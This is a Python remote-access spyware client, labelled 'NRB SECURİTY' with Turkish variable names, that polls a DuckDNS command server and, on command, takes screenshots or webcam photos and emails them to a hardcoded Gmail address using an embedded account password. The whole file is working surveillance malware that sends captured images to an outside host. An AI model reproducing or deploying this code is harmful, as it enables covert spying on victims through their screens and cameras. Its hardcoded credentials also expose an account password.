#!/usr/bin/env python
# -*- coding: utf-8 -*-
# NRB SECURİTY
import os
import time
import cv2
import pyautogui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import random
import socket
def screen_snap():
    asdf = random.randint(1,9999)
    ekran_goruntusu = pyautogui.screenshot()
    dosya_adi = "ekran_goruntusu{}.jpg".format(asdf)
    dosya_yolu = os.getcwd() + "/" + dosya_adi
    ekran_goruntusu.save(dosya_yolu)
    fromaddr = "zekaiyapay@gmail.com"
    toaddr = "runu772@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Screen shotcompleted"
    body = "Screen_shot"

    msg.attach(MIMEText(body, 'plain'))
    filename = "ekran_goruntusu{}.jpg".format(asdf)
    attachment = open(os.getcwd() + '/ekran_goruntusu{}.jpg'.format(asdf), "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "sakizsakiz1")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def webcam_snap():
    asd = random.randint(1, 9999)
    kamera_port = 0
    kamera = cv2.VideoCapture(kamera_port)
    time.sleep(0.2)
    return_value, image = kamera.read()
    cv2.imwrite("kameragoruntusu{}.png".format(asd), image)
    del (kamera)
    time.sleep(2)
    fromaddr = "zekaiyapay@gmail.com"
    toaddr = "runu772@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Webcam snap completed"
    body = "Webcam snap"

    msg.attach(MIMEText(body, 'plain'))
    filename = "kameragoruntusu{}.png".format(asd)
    attachment = open(os.getcwd() + '/kameragoruntusu{}.png'.format(asd), "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "sakizsakiz1")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
while True:
    s = socket.socket()
    host = "nrbnosafe@duckdns.org"
    port = 1604
    time.sleep(2)
    try:
        s.connect((host, port))
        yanit = s.recv(1024)
        s.close()
    except socket.error as msg:
        print("[Server aktif degil.] Mesaj:", msg)
    if yanit.decode("utf-8") == "webcam_snap":
        webcam_snap()
    elif yanit.decode("utf-8") == "sistem":
        if os.name == "posix":
            print("Kali linux")
        elif os.name == "nt":
            print("Windows")
    elif yanit.decode("utf-8") == "exit":
        exit()
    elif yanit.decode("utf-8") == "screen_shot":
        screen_snap()
    else:
        print("Hatali islem")
